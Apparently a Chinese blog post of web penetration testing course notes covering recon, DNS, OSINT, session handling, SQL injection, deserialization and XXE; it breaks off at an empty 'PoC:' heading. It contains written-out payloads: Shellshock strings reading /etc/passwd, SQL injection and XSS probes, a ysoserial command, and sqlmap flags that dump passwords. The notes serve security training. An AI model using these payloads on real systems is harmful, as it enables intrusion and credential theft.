<p>重点在于，现在大多数企业的测试更加侧重于业务的功能，而极少数会将大量的时间花费在安全测试之上。如果我们可以收到一些关于漏洞的报告，我们可以更加清楚地认识到安全测试缺失地问题是非常严重的。<br>虽然现在很多公司都有意识地进行渗透测试，但是其实渗透测试的质量参差不齐。许多第三方的渗透测试公司提供的渗透测试质量都非常的低下，这与测试者的能力也紧密相关。</p>
<h2 id="Application-Assessment-Methodologies"><a href="#Application-Assessment-Methodologies" class="headerlink" title="Application Assessment Methodologies"></a>Application Assessment Methodologies</h2><ul>
<li><p>Black Box, White Box, Gray Box.<br>黑盒测试表示没有任何目标系统的信息，而白盒测试则是可以获得关于目标系统的全部信息。 灰盒则介于两者之间。颜色越深则代表测试者可以获得的信息越少。</p>
</li>
<li><p>SAST (Static Application Security Testing)<br>大多数时候指代码审计</p>
</li>
<li><p>DAST （Dynamic Application Security Testing) &amp; Push Button Pentesting<br>没有获取源代码的权限，通过运行及与应用程序交互来寻找可能存在的漏洞。自动化工具在DAST中扮演了非常重要的角色。 但一键扫描这样的工具并没有看起来的这么有效，作为渗透测试工程师，深入理解自动化工具具体在做什么是很重要的。这样才能完成一个更有价值的渗透测试。</p>
</li>
</ul>
<p>Web Application的渗透测试与传统的针对服务器的渗透测试有一些不同。针对服务器的渗透测试在整个过程中，一步一步都非常明确。但对于Web Application的渗透测试而言，这样的步骤可能不完全适用。Web Application的渗透测试过程中，我们一般在发现漏洞后就会立刻想办法进行利用，而不会很明确地将漏洞发现以及漏洞利用明确地分割为两个阶段。</p>
<p>OWASP - Top10</p>
<p>OTG - OWASP Testing Guide is followed in this course. </p>
<h2 id="Course-Logistics"><a href="#Course-Logistics" class="headerlink" title="Course Logistics"></a>Course Logistics</h2><p>这一章节简单介绍了一下实验环境的构建。如何配置、使用SANS提供的虚拟机。跟着做就可以了。</p>
<h2 id="Web-Application-Pen-Tester’s-Toolkit"><a href="#Web-Application-Pen-Tester’s-Toolkit" class="headerlink" title="Web Application Pen Tester’s Toolkit"></a>Web Application Pen Tester’s Toolkit</h2><ul>
<li><p>Acunetix Vulnerability Scanner</p>
</li>
<li><p>Burp Scanner</p>
</li>
<li><p>Fortify WebInspect</p>
</li>
<li><p>IBM AppScan</p>
</li>
<li><p>Qualys WAS</p>
</li>
<li><p>Rapid7 AppSpider</p>
</li>
<li><p>Veracode Dynamic Analysis</p>
</li>
<li><p>Whitehat Sentinel</p>
</li>
<li><p>ZAP Scan</p>
</li>
<li><p>What’s intercept proxy (Burp and ZAP)</p>
</li>
<li><p>Browsers<br>在渗透测试中，我们希望使用”不安全“的浏览器。这样，浏览器不会自动拦截一些例如XSS的显示，造成渗透测试的错误结果。<br>所以，一般会选择Firefox或者Chromium.</p>
</li>
</ul>
<h2 id="WHOIS-and-DNS"><a href="#WHOIS-and-DNS" class="headerlink" title="WHOIS and DNS"></a>WHOIS and DNS</h2><p>WHOIS </p>
<ul>
<li>TCP port 43</li>
<li>Have Name(s) and phone number(s) and physical address and DNS servers</li>
<li>DNS information is most valuable to Web Application 渗透测试</li>
<li>现在许多WHOIS记录由于GDPR的要求，已经将许多个人信息删减了</li>
</ul>
<p>DNS</p>
<ul>
<li><p>使用UDP 53端口： 小于512bytes的负载</p>
</li>
<li><p>使用TCP 53端口：大于512bytes的负载，<strong>Zone Transfer区域传送</strong> </p>
</li>
<li><p>Zone Transfer<br>区域转移不应该被配置为可以公开, 不然攻击者可以非常容易地获取到内网的网络拓扑信息。dig xxx IXFR<br>当区域转移被禁用后，可以尝试reverse DNS(PTR) 或者 DNS爆破的方法来发现一些隐藏的子网。<br>PTR -&gt; 从IP反查域名， 获取目标域名的IP地址，对同一子网的其他IP地址进行PTR反查<br>DNS爆破一般使用字典爆破</p>
</li>
</ul>
<p>Tools：</p>
<ul>
<li><p>nslookup</p>
</li>
<li><p>dig</p>
</li>
<li><p>NMap</p>
</li>
<li><p>DNSRecon</p>
</li>
<li><p>Metasploit</p>
</li>
<li><p>nslookup<br>通常对DNS的利用从nslookup开始，这个命令在多种平台都适用。如果刚入侵了某一台服务器，那么nslookup也有非常大的可能性能在那台机器上运行。</p>
</li>
<li><p>dig<br>dig是一款功能强大的DNS客户端。在MacOS和大多数的UNIX&#x2F;Linux系统上都自带dig。</p>
</li>
</ul>
<p>dig @ip version.bind chaos txt</p>
<ul>
<li><p>Nmap DNS NSE scripts<br>dns-brute.nse 在搜索CNAME的时候非常有用。</p>
</li>
<li><p>DNSRecon</p>
</li>
<li><p>Metasploit<br>auxiliary&#x2F;gather&#x2F;dns_bruteforce</p>
</li>
</ul>
<p>Lab - DNS Harvesting<br>使用dig搜索域名解析所有的记录<br><code> dig [domain] -t any</code></p>
<p>尝试进行Zone Transfer (区域转移)<br><code> dig [domain] -t  axfr</code><br><code>dnsrecon.py -a -d [domain]</code><br><code>nmap --script=dns-zone-transfer [domain]</code></p>
<p>使用Nmap进行DNS爆破扫描<br><code>nmap --script=dns-brute [domain]</code><br>（对于限制了Zone Transfer的DNS服务，可以尝试进DNS爆破来获取信息）</p>
<p>使用DNSrecon来进行DNS爆破扫描<br><code>dnsrecon.py -d  [domain] -t brt -D [wordlist]</code><br>默认wordlist 为dnsrecon路径下的namelist.txt</p>
<p>metasploit的gather&#x2F;enum_dns模块也可以完成相同的工作。</p>
<h2 id="OSINT-（Open-Source-INTelligence"><a href="#OSINT-（Open-Source-INTelligence" class="headerlink" title="OSINT （Open Source INTelligence)"></a>OSINT （Open Source INTelligence)</h2><p>进行渗透测试时要尽可能得多获取关于目标公司的信息，这些信息都会最终帮助到渗透测试。 </p>
<p> 对于in-house （甲方） 的渗透测试，这部分可能看起来不是那么重要。 但是信息搜集技巧通常可以发现很多意想不到的收获。 （Github，Job posting，…）</p>
<ul>
<li><p>Google Search Operation<br> “” 精确匹配<br> site:<br> cache:   在cache中搜索<br> ext: 精确找到页面后缀<br> filetype: 精准找到文件后缀<br> Intitle:, inurl:  在页面标题和url中搜索关键词</p>
</li>
<li><p>Google dorks<br> <a target="_blank" rel="noopener" href="https://exploit-db.com/google-hacking-database">Google Hacking Database(GHDB)</a> 中可以查到相关的Google dork语句。</p>
</li>
<li><p>Cached Content<br>通过 archive.org 甚至有可能搜索到十多年前的页面记录。<br><strong>从互联网中删除一个存在过的内容并不是一件简单的事情</strong></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://www.shodan.io/">Shoadan</a><br>通过shodan可以搜索到各种连接网络的计算机，服务器，IOT…</p>
</li>
<li><p>Social Media (LinkedIn)<br>通过这类社交媒体，可能可以获取到员工的邮件地址，VPN用户名等等。</p>
</li>
<li><p>Metadata<br>多媒体文件中包含的信息</p>
</li>
</ul>
<p><code>exiftool [filename]</code></p>
<ul>
<li><p>Tesseract<br>自动识别、提取图片、PDF 中的文字信息</p>
</li>
<li><p>FOCA<br>运行在Windows上的免费软件，爬取域名中的各种文件，并分析其中包含的Metadata。<br>文件的作者可能包含用户信息。</p>
</li>
<li><p>Maltego<br>商业软件，将OSINT可能需要用到的步骤都包含了进去。</p>
</li>
<li><p>SpiderFoot<br>免费软件。 某些功能需要外部API的权限（外部网站的升级账号）</p>
</li>
<li><p>theHarvester<br>命令行工具，<br><code> theharvester -d sans.org -b all -f sans.html</code> </p>
</li>
<li><p>AutOSINT</p>
</li>
</ul>
<p>实验：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://transparencyreport.google.com/https/certificates">https://transparencyreport.google.com/https/certificates</a></li>
<li><a target="_blank" rel="noopener" href="https://crt.sh/">https://crt.sh</a><br>通过这两个网站，可以看到某个域名下所有注册过证书的子域名。通过这两个网站，也可以发现一些有意思的子域名，平台入口，<strong>攻击面</strong>！！</li>
</ul>
<h2 id="HTTP-Syntax-and-Messaging"><a href="#HTTP-Syntax-and-Messaging" class="headerlink" title="HTTP Syntax and Messaging"></a>HTTP Syntax and Messaging</h2><ul>
<li><p>HTTP&#x2F;0.9<br> 仅支持GET。只返回HTML文本。至今很多现代的web服务器任然支持HTTP&#x2F;0.9</p>
</li>
<li><p>HTTP&#x2F;1.0<br> 支持了GET, HEAD. 也描述了POST, PUT, DELETE</p>
</li>
<li><p>HTTP&#x2F;1.1<br> 现在正在使用的</p>
</li>
<li><p>HTTP&#x2F;2<br> 主要是为了提升性能。<br> 可以允许Server向Client推送消息。压缩成为二进制协议。Header也压缩为二进制来缩小非有效的数据。</p>
</li>
</ul>
<p> QUIC （Quick UDP Internet Connections)<br> 本质上是基于UDP的HTTP&#x2F;2</p>
<p><strong>Semantics描述了请求与响应是如何交换信息的： 比如HTTP方法，状态码，HTTP头信息等。Syntax是描述Semantic是如何在网络上传输。</strong></p>
<h2 id="HTTP-Semantics"><a href="#HTTP-Semantics" class="headerlink" title="HTTP Semantics"></a>HTTP Semantics</h2><ul>
<li><p>第一行： HTTP 方法（动作），URI，HTTP版本</p>
</li>
<li><p>HTTP方法<br>安全方法（不会修改页面状态）： GET, HEAD, OPTIONS<br>不安全方法： POST， PUT，DELETE</p>
</li>
<li><p>GET<br>没有payload，body中没有数据<br>不适合用来传递需要保密的信息(e.g.密码)</p>
</li>
</ul>
<p> 可以尝试将POST更换成GET来绕过一些防护措施</p>
<ul>
<li><p>HEAD<br> 仅返回头部信息，没有body的内容。可以提高效率，针对一些相应的头部内容进行测试。</p>
</li>
<li><p>TRACE<br> 被设计用来查错，不应该在生产环境中启用。</p>
</li>
<li><p>OPTIONS<br> 服务器返回可接受的所有HTTP方法。但是没什么大用，直接测试服务器一般也会返回405或者501. </p>
</li>
<li><p>User-Agent<br>对于大多数正常的用户，这里的值应该是浏览器的版本信息 （但有时候也会泄露一些版本信息）<br>有时候也会显示攻击者使用的工具名称</p>
</li>
<li><p>Referer<br>有时候web Application会检查这个值确保用户遵照了正确的流程。但是这个值是可以更改的…</p>
</li>
</ul>
<p>HTTP响应</p>
<ul>
<li>Server<br>对应USer-Agent ，泄露版本信息</li>
</ul>
<h2 id="HTTPS-and-Testing-for-Weak-Ciphers"><a href="#HTTPS-and-Testing-for-Weak-Ciphers" class="headerlink" title="HTTPS and Testing for Weak Ciphers"></a>HTTPS and Testing for Weak Ciphers</h2><p>测试SSL&#x2F;TLS弱加密算法</p>
<ul>
<li>Nmap NSE <code>ssl-enum-ciphers</code><br>对算法强度进行A-F的评分</li>
</ul>
<p> Qualys SSL Labs<br><a target="_blank" rel="noopener" href="https://www.ssllabs.com/ssltest">https://www.ssllabs.com/ssltest</a><br>可以通过这个网址来测试目标地址的SSL证书强健度</p>
<p>一般对于在公开的域名，我们可以使用Qualys的工具进行测试。但有时候，我们需要进行内网渗透测试，这种情况下，就需要使用nmap工具来完成HTTPS 加密算法强度的测试。</p>
<p>NMap中 <code>ssl-enum-ciphers</code>脚本的原理是逐个使用所有的加密算法，与目标域名进行连接。通过这种方法来确定服务器接收的所有加密方式。</p>
<p>Nmap脚本的分数没有将协议的支持（是否允许SSL, TLS 1.0等) 纳入分数计算。其他评分标准与SSL Lab一致。</p>
<p>Heartbleed Lab<br><code>nmap -sV --script ssl-heartbleed [domain]</code><br>可以使用Nmap对网站的端口进行扫描，检查是否存在Heartbleed漏洞</p>
<h2 id="Interception-Proxies"><a href="#Interception-Proxies" class="headerlink" title="Interception Proxies"></a>Interception Proxies</h2><ul>
<li><p>ZAP<br>ZAP的fuzzer非常强大<br>（免费工具，适合介绍给Application team使用）</p>
</li>
<li><p>Brup Suite<br>渗透测试工程师最喜欢的工具之一</p>
</li>
</ul>
<p>Scope设置：非常重要，限制扫描的范围，以免越过界限，进入到不在渗透测试范围的网络应用。</p>
<ul>
<li><p>Intercept<br>最重要的功能之一</p>
</li>
<li><p>Intruder<br>Fuzz功能</p>
</li>
<li><p>Repeater<br>将请求细微更改后反复发送到服务器，观察响应的区别</p>
</li>
<li><p>Sequencer<br>可以用来观察Web Application的session是否足够随机，难以预测。</p>
</li>
<li><p>Decoder<br>非常实用的工具来编码，反编码，计算哈希值。</p>
</li>
<li><p>Comparer<br>比较两个不同的请求，并且发现不同。</p>
</li>
<li><p>Extender<br>可以安装BApp插件或者是自定义插件来完成预设功能不能完成的工作</p>
</li>
</ul>
<h1 id="Configuration-Identity-and-Authentication-Testing"><a href="#Configuration-Identity-and-Authentication-Testing" class="headerlink" title="Configuration, Identity, and  Authentication Testing"></a>Configuration, Identity, and  Authentication Testing</h1><h2 id="Target-Profiling"><a href="#Target-Profiling" class="headerlink" title="Target Profiling"></a>Target Profiling</h2><p>了解服务器已经中间件的软件、版本信息有助于更好的对网络应用进行测试，以及利用漏洞。</p>
<ul>
<li>Port scanning</li>
</ul>
<p>端口扫描可以发现没有运行在80，443端口上的网络应用。收集端口背后运行的软件信息，查看是否存在漏洞<br><code>nmap -sV</code><br>version scan</p>
<ul>
<li><p>Zenmap<br>nmap的图形界面版本</p>
</li>
<li><p>Shodan<br>不仅仅是一个OSINT工具，可以在shodan上查看到版本信息</p>
</li>
<li><p>Netcraft Sitereport<br>可以看到Web服务器的历史配置数据<br>经常发生：开发人员转移了网站但不删除旧的网络应用</p>
</li>
<li><p>Application Infrastructure<br>记录所有之前步骤发现的Web应用相关组件。通过相关的详细信息查找对应的组件是否存在相应的漏洞<br>( 中间件，应用框架，CMS，数据库，其他的网络服务SSH,FTP,RDP)</p>
</li>
<li><p>测试HTTP方法 （OTG-Config-006)<br>robots.txt 包含了网络管理员不希望网络爬虫爬取的路径，但这些路径往往是渗透测试时我们所感兴趣的路径</p>
</li>
</ul>
<p>Lab:</p>
<ul>
<li><p>使用Netcat来对 <a target="_blank" rel="noopener" href="http://www.sec542.org/">http://www.sec542.org</a> 发出 HTTP 1.0 的 HEAD请求</p>
<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo -e <span class="string">&quot;<span class="keyword">HEAD</span> / http/1.0\r\n\r\n&quot;</span> | nc www.sec542.org <span class="number">80</span></span><br></pre></td></tr></table></figure>
<p>往往使用HTTP&#x2F;1.0是因为这是最简单的请求，不需要加上Host；同时还可以看服务器是否正确返回HTTP&#x2F;1.1</p>
</li>
<li><p>换使用Netcat来对 <a target="_blank" rel="noopener" href="https://www.sec542.org/">https://www.sec542.org</a> 发出 HTTP 1.0 的 HEAD请求</p>
<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo -e <span class="string">&quot;<span class="keyword">HEAD</span> / http/1.0\r\n\r\n&quot;</span> | nc www.sec542.org <span class="number">443</span></span><br></pre></td></tr></table></figure>
<p>因为没有使用证书，所以服务器会返回400 错误。但是这里我们更关注的HTTP头中的信息。 </p>
</li>
<li><p>使用Nmap对 <a target="_blank" rel="noopener" href="http://www.sec542.org进行一次版本扫描/">www.sec542.org进行一次版本扫描</a></p>
<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV www.sec542<span class="meta">.org</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>使用Nmap的NSE脚本，分析<a target="_blank" rel="noopener" href="http://www.sec542.org/">http://www.sec542.org</a> 的robots.txt文件</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap <span class="attr">--script</span>=http-robots<span class="selector-class">.txt</span> www<span class="selector-class">.sec542</span>.org</span><br></pre></td></tr></table></figure></li>
</ul>
<p>可以在<code>/usr/local/share/nmap/scripts</code>下查看所有的NSE脚本</p>
<h2 id="Shellshock"><a href="#Shellshock" class="headerlink" title="Shellshock"></a>Shellshock</h2><ul>
<li>软件配置缺陷<br>Nikto可以用来是扫描这一类漏洞<br>不是最让人感觉兴奋的漏洞，但往往会包含在渗透测试的范围之内，而且也同样非常重要。</li>
</ul>
<p>Injection: </p>
<ul>
<li>() { 42;};echo;&#x2F;bin&#x2F;cat &#x2F;etc&#x2F;passwd</li>
<li>() { 42;};echo;&#x2F;usr&#x2F;bin&#x2F;id</li>
</ul>
<p>把CGI环境变量HTTP_USER_AGENT的值设置为上面的payload.</p>
<h2 id="Insufficient-Logging-and-Monitoring"><a href="#Insufficient-Logging-and-Monitoring" class="headerlink" title="Insufficient Logging and Monitoring"></a>Insufficient Logging and Monitoring</h2><p>这一项被加入到了最新的OWASP Top10中。<br>这一部分在实际生产中是非常不足的，数据泄露发现的平均时间是191天。攻击者往往在成功前已经有多次尝试，所以monitoring是非常重要的。</p>
<p>但SOC实际运行起来困难很大，人才大多比较年轻，很难正确做出判断。公司也往往不愿意在SOC或者Blue Team上投入非常多，相较而言，公司更愿意在顶级的Red Team和渗透测试上花费。</p>
<p>需要在多方面记录日志：</p>
<ul>
<li>Web Servers</li>
<li>Database servers</li>
<li>Authentication Systems</li>
<li>WAF and LB</li>
<li>Web Application 本身</li>
</ul>
<p>一定需要发现的事件：</p>
<ul>
<li>失败和成功的身份验证 （如果有人运行了一个身份登录爆破，但系统却发现不了，没有报警：不可接受）</li>
<li>敏感数据的操作、读取</li>
<li>服务器端验证失败的错误信息</li>
</ul>
<p>使用SIEM来集中化管理日志。</p>
<ul>
<li>高风险的安全事件需要可以触发警报</li>
<li>低风险的事件需要可以通过报告以及展示板来显示<br>-可以防止日志被删除或者篡改</li>
<li>确保所有日志的时间同步，并使用UTC作为时区格式</li>
</ul>
<p>测试事件响应的流程</p>
<ul>
<li>经常性进行演习</li>
<li>通过渗透测试检查Blue Team是否可以顺利发现攻击</li>
</ul>
<h2 id="Spidering-Web-Application"><a href="#Spidering-Web-Application" class="headerlink" title="Spidering Web Application"></a>Spidering Web Application</h2><p>目标是发现在Web Application中存在的所有链接.<br>robots.txt 是公开的，不应该使用robots.txt来隐藏敏感的路径和内容。相反，攻击者往往会使用robots.txt中的路径最为攻击点</p>
<table>
<thead>
<tr>
<th>人工爬取</th>
<th>自动化爬取</th>
</tr>
</thead>
<tbody><tr>
<td>慢，人来操作</td>
<td>快速，多线程</td>
</tr>
<tr>
<td>可以在比较敏感或者关键的功能上使用</td>
<td>有可能会造成一定程度的破坏</td>
</tr>
<tr>
<td>可以理解应用程序的功能和流程</td>
<td>可以定位到应用大多数需要的输入</td>
</tr>
<tr>
<td>可以发现并当即尝试利用</td>
<td>同时获取大量的信息，然后需要继续用自动化工具处理信息</td>
</tr>
</tbody></table>
<p>结合两种爬取方式：<br>人工： 记录下Web应用中的重要功能（文件上传等），关系到数据库的查询操作，跟踪输入的数据<br>自动化： 知道自动化的目的，使用Burp和ZAP中的被动扫描</p>
<p><code>wget -r</code>可以用作命令行爬虫工具。 </p>
<p><code>wget -r [domain] -P /dir</code> </p>
<p><code>cewl</code> 工具可以通过网站爬取关于网站的关键词。可以用于构造定制化的字典</p>
<p>Wappalyzer 工具可以用来获取Web Application 的组件信息</p>
<p>分析爬虫获取到的结果： 对于爬取到的链接中的页面内容，可以重点关注一些关键的功能，代码中的注释，禁用的功能还有隐藏的链接</p>
<p>Lab<br>Burp<br>设置范围: <code>.*?sec542.org$</code> </p>
<h2 id="Forced-Browsing"><a href="#Forced-Browsing" class="headerlink" title="Forced Browsing"></a>Forced Browsing</h2><p>通过字典攻击的方式，发现没有与其他内容互相连接的内容。<br>Burp -&gt; Engagement tools -&gt; Discover Content</p>
<h2 id="Fuzzing"><a href="#Fuzzing" class="headerlink" title="Fuzzing"></a>Fuzzing</h2><p> Fuzzing 指将提交给Web Application的正常输入替换成一些试图利用漏洞或者猜测用户身份的输入<br> 常见的如<code>&lt;script&gt;alert(42)&lt;/script&gt;</code> 和 <code>&#39; or 1=1 #</code> 之类的<br> 而且几乎可以应用在任何地方：  请求的头部，POST参数， GET参数， PUT负载…</p>
<p> Seclist 包含了许多高质量的Web应用渗透测试可能用到的Fuzzing内容<br> SEC542 VM 中 <code>/opt/seclists</code><br> <a target="_blank" rel="noopener" href="https://github.com/danielmiessler/seclists">https://github.com/danielmiessler/seclists</a></p>
<h2 id="Information-Leakage"><a href="#Information-Leakage" class="headerlink" title="Information Leakage"></a>Information Leakage</h2><p>这一类漏洞通常不可以被直接利用，但缺会对渗透测试或者是攻击者提供非常一些非常有用的信息。<br>通过这种途径获得的信息往往会被用在之后的攻击&#x2F;利用过程中。</p>
<p>Directory Browsing<br>快速对Apache&#x2F;Nginx测试： 尝试访问image所在的路径</p>
<p>Google Search来查找Directory Browsing<br><code> site:gov intitle:&quot;Index of&quot; &quot;last modified&quot;</code> </p>
<p> Automatically discovery:<br> Nikto, w3af( powerful but buggy), ZAP’s force browse, Metasploit’s WMAP</p>
<h2 id="Authentication"><a href="#Authentication" class="headerlink" title="Authentication"></a>Authentication</h2><p>HTTP Basic Authentication<br>非常老的认证协议，服务器会发送一个名为Realm的参数，描述对被保护的资源进行描述。<br>用户认证信息被保存在服务器上。（Apache存在.htaccess 文件中）</p>
<p>传输时将用户名密码对进行Base64编码后传输到服务器。没有加密<br>缺点： 无法登出，登录后的每个请求都包含有身份认证的信息（都是base64编码的）。无法锁定账户</p>
<p>Digest Authentication<br>对Basic认证方式的改进，不再直接传输密码，但是依旧是可以破解的…</p>
<p>Windows Integrated Authentication<br>使用了NTLM加密，可以被破解</p>
<p>Form-based<br>现在最常用的认证方式，主要分为三个部分： 客户端的用户身份认证表单， 服务器端的身份认证处理代码，需要认证后才能访问到的资源<br>安全性取决于开发者如何开发。应用程序需要能够正确地处理Session，账号锁止机制同样取决于开发者如何开发</p>
<p>OpenId&#x2F;OAuth&#x2F;SAML<br>？？？</p>
<h2 id="Username-Harvesting"><a href="#Username-Harvesting" class="headerlink" title="Username Harvesting"></a>Username Harvesting</h2><p>通过猜测地方法破解账户需要猜测用户名再猜测密码： 猜测用户名往往是第一步<br>尝试登陆：有时候网络应用对存在&#x2F;不存在的用户名返回不同的响应，通过对比不同的响应，可以判断出用户名是否存在 (这里的不同可能很明显的显示在页面上，也有可能只是HTTP返回包中的细微差别-&gt; Burp Comparer)</p>
<p>如果完全一致，可以尝试”忘记密码“页面。</p>
<p>Side-Channel Attacks<br>有时候应用程序遇到正确的用户名会计算密码的哈希值进行校验，而遇到错误的用户名则会立刻返回错误。<br>如果用好了Slow-Hash的方式，那么这里就存在了一个可以被发现的区别来判断用户名的正确与否</p>
<h2 id="Burp-Intruder"><a href="#Burp-Intruder" class="headerlink" title="Burp Intruder"></a>Burp Intruder</h2><p>有四种模式：<br>Sniper: 每次在同一个field中尝试一种Payload<br>Battering Ram: 每次在多个field中同时尝试同一种payload<br>Pitchfork: 往往最少用到， 每次在多个field中同时尝试一组数据集<br>Cluster Bomb: 尝试数据集中的所有组合。</p>
<h1 id="Injection"><a href="#Injection" class="headerlink" title="Injection"></a>Injection</h1><h2 id="Session-Management"><a href="#Session-Management" class="headerlink" title="Session Management"></a>Session Management</h2><p>通过应用或者服务器来实现。需要认真检查，防止未授权访问的产生<br>Session ID 可以在 Cookies, POST的隐藏表单，自定义HTTP头，URI参数中找到。<br>常用的种类： JSESSIONID，PHPSESSID，ASP.NET_SessionID<br>如果是非常用的SessionID种类，可以通过退出重新登陆后比较参数来发现</p>
<p>session ID 需要具备的性质： 不可预测性，防止篡改，会过期，保密性。<br>在Cookie中实现是最常见的方式</p>
<p>不可预测性: 增加熵 –&gt; 长度，字符种类，算法复杂度<br>防止篡改： 网路应用需要可以有能力检查出某一个sessionID是否真实有效<br>                确保sessionID在每次登陆后都会更改， 对于安全性要求非常高的应用而言，需要在每个页面刷新时都更新SessionID<br>                高敏感度的功能在操作时需要检查其他与SessionID相关联的属性：如Referer, User-Agent, src IP<br>过期策略： 登出后需要立刻过期，服务器的响应不应该再包含有过期的SessionID，包含过期SessionID的客户端响应需要被无视或者强制重定向到登陆页面<br>Session应该在以下情况下过期： 用户点击了logout，超过了有效时间，检测到了session篡改的企图。</p>
<p>保密性: Session ID 应当加密传输，在Cookie中也应该启用Secure Flag选项</p>
<h2 id="Session-Attack"><a href="#Session-Attack" class="headerlink" title="Session Attack"></a>Session Attack</h2><p>开发时 (开发安全) 对于Session管理的实现，应该参照OWASP的Session Management Cheat Sheet. </p>
<p>测试可预测性：<br>获取SessionID，检查是否可靠。<br>工具： BurpSuite Sequencer; Google; 人工观察…</p>
<p>Session Fixation: SessionID不应该在用户登陆前就被设定好。<br>观察 SessionID在用户登陆后是否发生变化； 创建一个SessionID，然后再进行登陆，观察是否变化。<br>否则攻击者可以选定一个SessionID，通过社会工程攻击诱骗用户点击存有预设SessionID的链接进行登陆，登陆成功后，攻击者就可以使用这个SessionID进行需要授权的操作。</p>
<p>Session theft<br>XSS 漏洞可能会让攻击者获取到SessionID. HTTPOnly flag可以防止攻击者通过JS获取到cookie中的sessionID</p>
<p>Session Logout<br>尝试登出后再使用先前的session ID</p>
<h2 id="Authentication-Bypass"><a href="#Authentication-Bypass" class="headerlink" title="Authentication Bypass"></a>Authentication Bypass</h2><p>OTG-AUTHN-004</p>
<p>逐个页面测试没有登陆的用户能否访问。</p>
<h2 id="Authorization-Bypass"><a href="#Authorization-Bypass" class="headerlink" title="Authorization Bypass"></a>Authorization Bypass</h2><p>OTG-AITJZ-002; OTG-AUTHZ-003; OTG-AUTHZ-004</p>
<p>逐个页面测试是否有admin页面可以被普通用户访问<br>需要拥有两个不同权限的账号</p>
<p>如果同一个SessionID但是不同的uid，登陆后如果指向不同的用户，则说明存在问题</p>
<p>IDOR - Insecure Direct Object Reference<br>可以通过用户输入的参数直接访问到网页的资源：PDF，图片，等… </p>
<h2 id="Mutillidae"><a href="#Mutillidae" class="headerlink" title="Mutillidae"></a>Mutillidae</h2><p>故意设计存在漏洞的网络应用</p>
<h2 id="Command-Injection"><a href="#Command-Injection" class="headerlink" title="Command Injection"></a>Command Injection</h2><p>OTG-INPVAL-013</p>
<p>这类漏洞会在网页使用用户输入作为系统命令时产生。 </p>
<p>利用：<br>读取文件 &#x2F;etc&#x2F;passwd&#x2F; C:\Windows\win.ini ； ping自己的一个服务器   –&gt; 判断存在<br>创建远程shell登陆</p>
<h2 id="File-Inclusion-and-Directory-Traversal"><a href="#File-Inclusion-and-Directory-Traversal" class="headerlink" title="File Inclusion and Directory Traversal"></a>File Inclusion and Directory Traversal</h2><p>OTG-INPVAL-012</p>
<p>利用后可以：</p>
<ul>
<li>应用配置文件</li>
<li>系统配置文件</li>
<li>源代码</li>
<li>事件日志</li>
<li>用户配置文件</li>
<li>用户文档</li>
</ul>
<p>RFI 从远程的其他服务器包含文件，危害更大</p>
<h2 id="Insecure-Deserialization"><a href="#Insecure-Deserialization" class="headerlink" title="Insecure Deserialization"></a>Insecure Deserialization</h2><p>Marshalling pickles</p>
<p>可能存在于任何面向对象的语言，最常见于Java</p>
<p>开发者经常会序列化一个对象，更容易作为参数进行传输，反序列化后，服务器端的内存中可以得到一个完全相同的对象。<br>但是攻击者可以在客户端篡改这个对象</p>
<p>使用序列化的技术：</p>
<ul>
<li>Remote Method Invocation (RMI)</li>
<li>Java Management Extension (JMX)</li>
<li>Java Message Service (JMS)</li>
<li>Java Server Faces Implementation (ViewState)</li>
</ul>
<p>首先序列化后的数据容易被篡改。</p>
<p>利用： Ysoserial，包含了一组Java库中存在的gadget 链，来生成利用payload</p>
<p>Lab</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java -jar <span class="regexp">/usr/</span>local<span class="regexp">/bin/y</span>soserial-master-SNAPSHOT.jar CommonsCollections5 <span class="string">&#x27;[bash command]&#x27;</span> </span><br><span class="line">| base64 -w0 &gt; payload.txt</span><br></pre></td></tr></table></figure>


<h2 id="SQL-Injection-Primer"><a href="#SQL-Injection-Primer" class="headerlink" title="SQL Injection Primer"></a>SQL Injection Primer</h2><p>原因： 网络应用需要SQL数据库来保存数据，应用同时还需要对SQL进行数据操作。</p>
<p>一些非常基础的SQL知识</p>
<h2 id="Discovering-SQLi"><a href="#Discovering-SQLi" class="headerlink" title="Discovering SQLi"></a>Discovering SQLi</h2><p><strong>所有的用户可以修改的值都可以成为SQLi的目标</strong></p>
<p>Inline SQLi: can see the error &#x2F; output<br>Blind SQLi: No detailed error message &#x2F; output</p>
<p>加上后缀观察输入的语句是否被作为SQL语句执行：<br>比较 Dent 与 Dent’;#   Dent’;–   De’&#x2F;**&#x2F;‘nt     De’’nt   De’||’nt   等输入的结果，如果一致的话，说明SQLi存在<br>同理还有加上 AND 1&#x3D;1观察结果是否被改变</p>
<h2 id="Exploiting-SQLi"><a href="#Exploiting-SQLi" class="headerlink" title="Exploiting SQLi"></a>Exploiting SQLi</h2><p>首先通过错误代码判断数据库类型，版本<br>information_schema 获得数据库的更多信息</p>
<p>对于显示输出的SQLi, 可以进行的利用：<br>Stacked Query, 通过分隔符，让数据库同时执行两句SQL语句   ; DROP TABLE<br>还可以UNION SELECT来获取其他表中的信息，但是需要列数相同…<br>所以需要进行一些次数的尝试。使用NULL</p>
<p>SQLMap</p>
<p>Read file<br><code>--file-read /etc/passwd</code></p>
<p>Dump the DB users and passwords<br><code>--users --passwords</code></p>
<p>search in Column names of “my_wiki” database<br><code>-D my_wiki --search -C pass</code></p>
<h1 id="XXE-and-XSS"><a href="#XXE-and-XSS" class="headerlink" title="XXE and XSS"></a>XXE and XSS</h1><h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><p>XML是一种标签语言，常被用来做数据交换。</p>
<p>XXE (XML External Entity) 如果攻击者可以上传一段XML文件到服务器端，那么他们就有可能可以利用XML处理器的漏洞，来获得数据，执行命令，DOS攻击等等…</p>
<p>XML is an example of SSRF. Client tricks XML server to initiate requests to internal web server. </p>
<p>PoC: </p>
